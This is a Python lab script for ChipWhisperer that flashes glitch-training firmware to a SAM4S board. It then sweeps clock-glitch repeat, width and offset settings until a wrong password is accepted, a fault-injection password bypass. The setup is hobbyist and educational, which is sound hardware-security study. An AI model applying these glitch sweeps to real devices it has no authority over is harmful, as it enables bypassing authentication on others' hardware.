#!/usr/bin/env python3
# MIT License
#
# Copyright (c) 2026 David Reguera Garcia (aka Dreg)
# dreg@rootkit.es - https://github.com/therealdreg/abductor
#
# Disclaimer: this is the work of a hobbyist, shared in good faith for educational
# purposes. It is not professional work and may contain mistakes or inaccuracies;
# corrections and feedback are welcome. Provided "as is" and used at your own risk.
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

# Clock glitch via UFO+Abductor, sweeping scope.glitch.repeat upward (more consecutive glitched cycles)
# to test whether it overcomes the path attenuation that produced no observed effect at repeat=1.
import os, time, subprocess
from collections import Counter
import chipwhisperer as cw

PLATFORM="CW312_SAM4S"; SS_VER="SS_VER_2_1"
FWDIR="/home/dreg/chipwhisperer/firmware/mcu/simpleserial-glitch"
HEX=f"{FWDIR}/simpleserial-glitch-{PLATFORM}.hex"
TC="/home/dreg/toolchains/xpack-arm-none-eabi-gcc-13.3.1-1.1/bin"
ENV=dict(os.environ, PATH=TC+":"+os.environ["PATH"])

# (re)flash in case the target was moved / power-cycled
subprocess.run(["make",f"PLATFORM={PLATFORM}","CRYPTO_TARGET=NONE",f"SS_VER={SS_VER}","-j"],
               cwd=FWDIR, env=ENV, capture_output=True)
scope=cw.scope(); target=cw.target(scope, cw.targets.SimpleSerial2)
scope.default_setup()
ok=False
for k in range(3):
    try: cw.program_target(scope, cw.programmers.SAM4SProgrammer, HEX); ok=True; print("FLASHED OK", flush=True); break
    except Exception as e: print("flash retry:", e, flush=True); time.sleep(1.0)
if not ok:
    print("FLASH FAILED - reconnect USB", flush=True); raise SystemExit(2)
target.reset_comms()
scope.glitch.enabled=True; scope.glitch.clk_src="pll"; scope.glitch.output="clock_xor"
scope.glitch.trigger_src="ext_single"; scope.io.hs2="glitch"; scope.cglitch_setup(); scope.adc.timeout=0.1
def reboot_flush():
    scope.io.nrst=False; time.sleep(0.05); scope.io.nrst="high_z"; time.sleep(0.05); target.flush()
WRONG=bytearray([0]*5)
def check(pw):
    reboot_flush(); target.simpleserial_write('p', pw)
    v=target.simpleserial_read_witherrors('r',1,glitch_timeout=10,timeout=1000)
    return v['payload'][0] if (v['valid'] and v['payload']) else None
_w=check(WRONG); _c=check(bytearray([0x74,0x6F,0x75,0x63,0x68]))
print("sanity wrong ->",_w," correct ->",_c, flush=True)
if _w!=0 or _c!=1:
    print("SANITY FAILED", flush=True); scope.dis(); target.dis(); raise SystemExit(2)
def attempt(rep,w,o,e):
    if scope.adc.state: reboot_flush()
    reboot_flush()
    scope.glitch.repeat=rep; scope.glitch.width=w; scope.glitch.offset=o; scope.glitch.ext_offset=e
    scope.arm(); target.simpleserial_write('p', WRONG)
    if scope.capture(): reboot_flush(); return "reset"
    v=target.simpleserial_read_witherrors('r',1,glitch_timeout=10,timeout=50)
    if not v['valid'] or v['payload'] is None: reboot_flush(); return "reset"
    return "success" if v['payload'][0]==1 else "normal"

cw.set_all_log_levels(cw.logging.ERROR); reboot_flush()
WIDTHS=[3400,3800,4200,4500]; OFFS=[2300,2500,2700,2900]; EXTS=list(range(85,160,3))
overcame=None
for rep in [1,2,4,8,16,32]:
    c=Counter(); succ=[]
    for w in WIDTHS:
        for o in OFFS:
            for e in EXTS:
                cat=attempt(rep,w,o,e); c[cat]+=1
                if cat=="success": succ.append((rep,w,o,e))
    print(f"repeat={rep:2d}: reset={c['reset']:3d} normal={c['normal']:3d} success={c['success']:2d}"
          + (f"  bypass: {succ[0]}" if succ else ""), flush=True)
    if c['success']>0 and overcame is None:
        overcame=rep
        print(f"  --> clean password bypass (wrong password accepted) first seen at repeat={rep}: {succ[0]}", flush=True)
    elif (c['reset']+c['success'])>=3 and rep and not overcame:
        # crashes without a clean bypass yet: the glitch reaches the core but faults are crash-dominated
        print(f"      (repeat={rep}: glitch faults the SAM4S but crash-dominated; {c['reset']} resets, {c['success']} clean bypasses)", flush=True)
cw.set_all_log_levels(cw.logging.WARNING); scope.dis(); target.dis()
print("OVERCAME at repeat:", overcame)
print("DONE")
